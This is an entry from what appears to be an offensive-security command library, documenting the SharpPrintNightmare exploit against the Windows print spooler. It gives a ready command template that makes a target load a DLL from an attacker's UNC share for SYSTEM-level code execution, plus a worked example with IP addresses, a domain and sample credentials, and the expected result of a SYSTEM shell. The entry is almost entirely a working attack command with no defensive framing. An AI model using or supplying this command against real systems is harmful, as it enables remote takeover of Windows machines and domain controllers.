---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
type: command
executor: cmd
data: >-
  SharpPrintNightmare.exe '\\\\ATTACKER\\share\\payload.dll'
  'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_xxx\\Amd64\\UNIDRV.DLL'
  '\\\\TARGET\\pipe' DOMAIN USER PASSWORD
output: null
created_at: '2023-04-06T03:56:02.971400+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - rce
  - printnightmare
verified: true
validated: true
---

# SharpPrintNightmare-RCE-RunAs-NetOnly

## Command

```cmd
SharpPrintNightmare.exe '\\\\ATTACKER\\share\\payload.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_xxx\\Amd64\\UNIDRV.DLL' '\\\\TARGET\\pipe' DOMAIN USER PASSWORD
```

## Description

Executes RCE remotely using runas /netonly for credential delegation, loading the DLL via spooler for SYSTEM access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| '\\\\ATTACKER\\share\\payload.dll' | UNC DLL path | Yes |
| 'C:\\...\\UNIDRV.DLL' | Hijack path | Yes |
| '\\\\TARGET\\pipe' | Target pipe/IP | Yes |
| DOMAIN USER PASSWORD | Auth credentials | Yes |

## Examples

### Basic Usage

```cmd
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
```

## Expected Output

'RunAs executed, DLL loaded'. SYSTEM payload triggers (e.g., shell).

## Related

- [[Related Procedure: Exploit-PrintNightmare-for-SYSTEM-Shell-on-Domain-Controller]]
- [[Related Tool: SharpPrintNightmare]]
